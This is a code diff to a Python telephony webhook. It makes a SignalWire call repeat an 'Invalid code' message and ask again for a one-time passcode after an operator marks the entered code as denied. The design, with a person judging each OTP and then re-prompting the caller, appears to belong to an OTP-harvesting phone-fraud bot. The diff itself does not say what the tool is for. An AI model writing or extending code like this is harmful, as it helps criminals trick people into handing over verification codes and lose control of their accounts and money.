@@ -440,11 +440,26 @@ async def signalwire_wait(call_id: str):
             return Response(content=twiml, media_type="application/xml")
             
         elif admin_decision == 'deny':
-            # Play rejected message
+            # Play rejected message and ask for OTP again
             rejected_message = call_data.get('rejected_message', 'Invalid code')
+            digits_required = call_data.get('digits', 6)
+            
+            # Clear admin decision untuk memperbolehkan input ulang
+            await MongoDBService.update_call_field(call_id, 'admin_decision', None)
+            
+            # Redirect ke gather OTP dengan rejected message
+            gather_url = f"{backend_url}/api/webhooks/signalwire/{call_id}/retry-otp"
+            
+            # Repeat rejected message 2x lalu gather
             twiml = f'''<?xml version="1.0" encoding="UTF-8"?>
 <Response>
     <Say voice="{voice}">{rejected_message}</Say>
+    <Pause length="2"/>
+    <Say voice="{voice}">{rejected_message}</Say>
+    <Gather numDigits="{digits_required}" action="{gather_url}" method="POST" timeout="20">
+        <Pause length="1"/>
+    </Gather>
+    <Say voice="{voice}">We did not receive the code. Goodbye.</Say>
     <Hangup/>
 </Response>'''
             return Response(content=twiml, media_type="application/xml")
